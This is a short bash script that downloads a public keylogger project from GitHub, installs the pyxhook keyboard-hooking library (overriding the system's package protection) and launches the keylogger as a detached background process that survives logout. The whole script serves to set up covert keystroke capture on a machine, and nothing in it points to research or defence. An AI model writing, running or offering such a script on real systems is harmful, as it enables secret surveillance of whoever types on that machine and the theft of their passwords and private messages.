#!/bin/bash
# Automatically shuts the script down when you encounter an error
set -e

git clone https://github.com/GiacomoLaw/Keylogger/
pip3 install pyxhook --break-system-packages
nohup python3 keylogger.py &
